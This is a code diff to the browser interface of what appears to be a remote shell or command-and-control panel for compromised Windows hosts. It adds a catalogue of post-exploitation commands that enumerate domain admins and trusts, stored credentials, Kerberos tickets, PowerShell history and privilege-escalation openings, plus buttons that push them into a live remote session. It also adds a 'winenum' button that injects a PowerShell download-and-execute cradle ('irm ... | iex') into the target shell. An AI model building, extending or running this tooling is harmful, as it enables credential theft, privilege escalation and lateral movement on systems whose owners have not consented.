@@ -2,6 +2,45 @@
 (function(){
   let enabled=false,ticket='',expires=0,platform='win',selected='',terminal=null,fit=null,cursor=0,generation=0,polling=false;
   let inputQueue=Promise.resolve(),sessions=[],available=[],proxy=null,callbacks=[];
+  const reconCommands=[
+    ['Identity','Whoami full',String.raw`whoami /all`],
+    ['Identity','Token privileges',String.raw`whoami /priv`],
+    ['Identity','Current identity',String.raw`$env:USERDOMAIN; $env:USERNAME; [Security.Principal.WindowsIdentity]::GetCurrent().Name`],
+    ['Host','System info',String.raw`systeminfo`],
+    ['Host','Computer info',String.raw`Get-ComputerInfo | Format-List`],
+    ['Host','Recent patches',String.raw`Get-HotFix | Sort InstalledOn -Descending | Select -First 15`],
+    ['Network','IP configuration',String.raw`ipconfig /all`],
+    ['Network','Routes',String.raw`route print`],
+    ['Network','ARP table',String.raw`arp -a`],
+    ['Network','Listening TCP',String.raw`Get-NetTCPConnection -State Listen | Sort LocalPort | Select LocalAddress,LocalPort,OwningProcess`],
+    ['Network','SMB mappings',String.raw`net use; Get-SmbMapping`],
+    ['Network','Proxy',String.raw`netsh winhttp show proxy`],
+    ['Users','Local users',String.raw`net user`],
+    ['Users','Local groups',String.raw`net localgroup`],
+    ['Users','Administrators',String.raw`net localgroup administrators`],
+    ['Users','Logged on',String.raw`quser; query session`],
+    ['Domain','Workstation config',String.raw`net config workstation`],
+    ['Domain','Domain controllers',String.raw`nltest /dsgetdc:$env:USERDNSDOMAIN`],
+    ['Domain','Trusts',String.raw`nltest /domain_trusts`],
+    ['Domain','Domain groups',String.raw`net group /domain`],
+    ['Domain','Domain Admins',String.raw`net group "Domain Admins" /domain`],
+    ['Domain','Group policy',String.raw`gpresult /r`],
+    ['Services','Services',String.raw`Get-CimInstance Win32_Service | Select Name,State,StartMode,StartName,PathName | Format-Table -AutoSize`],
+    ['Services','Unquoted paths',String.raw`Get-CimInstance Win32_Service | Where PathName -match '^[^"].*\.exe\s' | Select Name,PathName`],
+    ['Services','Scheduled tasks',String.raw`Get-ScheduledTask | Select TaskPath,TaskName,State,Author | Sort TaskPath,TaskName`],
+    ['Services','Startup commands',String.raw`Get-CimInstance Win32_StartupCommand | Select Name,Command,Location,User`],
+    ['Files','Program Files ACL',String.raw`icacls "C:\Program Files"`],
+    ['Files','Temp ACL',String.raw`icacls "C:\Windows\Temp"`],
+    ['Files','PATH entries',String.raw`$env:Path -split ';'`],
+    ['Credentials','Stored credentials',String.raw`cmdkey /list`],
+    ['Credentials','Kerberos tickets',String.raw`klist`],
+    ['Credentials','Credential files',String.raw`Get-ChildItem "$env:APPDATA\Microsoft\Credentials" -Force`],
+    ['Credentials','PowerShell history',String.raw`Get-Item "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"`],
+    ['Privesc','AlwaysInstallElevated',String.raw`Get-ItemProperty 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer','HKCU:\SOFTWARE\Policies\Microsoft\Windows\Installer' -Name AlwaysInstallElevated`],
+    ['Privesc','Autologon',String.raw`Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' | Select AutoAdminLogon,DefaultUserName,DefaultDomainName`],
+    ['Privesc','UAC',String.raw`Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' | Select EnableLUA,ConsentPromptBehaviorAdmin`],
+    ['Privesc','Defender',String.raw`Get-MpComputerStatus | Select AMEnabled,RealTimeProtectionEnabled,AntivirusEnabled`]
+  ];
   const error=q('console-error'),container=q('browser-terminal');
   const terminalSession=new URLSearchParams(location.search).get('terminal');
   if(terminalSession){document.body.classList.add('terminal-view');showView('shells')}
@@ -79,6 +118,26 @@
     });
   }
   async function removeCallback(id){try{await api('callbacks/'+id+'/remove','POST',{});await refresh();notice('')}catch(e){notice(e.message)}}
+  function runRecon(command){
+    if(!selected){notice('Select a console first');return}
+    api('sessions/'+selected+'/input','POST',{data:command+'\r'}).catch(e=>notice(e.message));
+  }
+  function renderRecon(){
+    const list=q('recon-list');if(!list)return;
+    const filter=(q('recon-search').value||'').trim().toLowerCase();
+    list.replaceChildren();
+    let category='';
+    reconCommands.filter(item=>!filter||(item[0]+' '+item[1]+' '+item[2]).toLowerCase().includes(filter)).forEach(item=>{
+      if(item[0]!==category){category=item[0];const heading=document.createElement('div');heading.className='recon-cat';heading.textContent=category;list.appendChild(heading)}
+      const row=document.createElement('div');row.className='recon-row';
+      const label=document.createElement('span');label.className='hint';label.textContent=item[1];
+      const code=document.createElement('code');code.textContent=item[2];
+      const actions=document.createElement('span');actions.className='recon-btns';
+      const run=document.createElement('button');run.className='btn ghost sm';run.textContent='Run';run.addEventListener('click',()=>runRecon(item[2]));
+      const copy=document.createElement('button');copy.className='btn ghost sm';copy.textContent='Copy';copy.addEventListener('click',()=>copyText(item[2],'Command copied'));
+      actions.append(run,copy);row.append(label,code,actions);list.appendChild(row);
+    });
+  }
   async function refresh(){
     if(!enabled||polling)return;polling=true;
     try{
@@ -127,6 +186,20 @@
     try{const callback=await api('callbacks','POST',{local,remote});q('callback-local').value='';q('callback-remote').value='';await refresh();notice('Callback '+callback.remote+' → 127.0.0.1:'+callback.local)}
     catch(e){notice(e.message)}
   });
+  q('recon-search').addEventListener('input',renderRecon);
+  q('recon-winenum').addEventListener('click',async()=>{
+    if(!selected){notice('Select a console first');return}
+    const session=sessions.find(s=>s.id===selected);
+    if(!session||session.os!=='windows'){notice('Select a Windows console first');return}
+    try{
+      const info=await api('winenum/ticket','POST',{});
+      const origin=location.origin;
+      const command=`$ExposeTicket='${info.ticket}'; $ExposeOrigin='${origin}'; irm "$ExposeOrigin/console/winenum.ps1?ticket=$ExposeTicket" | iex`;
+      await api('sessions/'+selected+'/input','POST',{data:command+'\r'});
+      notice('winenum started in the selected console');
+    }catch(e){notice(e.message)}
+  });
+  renderRecon();
   new ResizeObserver(fitTerminal).observe(container);
   window.addEventListener('hashchange',()=>{if(!q('shells').hidden){fitTerminal();refresh()}});
   setInterval(()=>{refresh();if(ticket&&expires<Date.now()){q('console-copy').disabled=true;q('console-invite-info').textContent='Connection link expired. Create a new link.'}},2000);
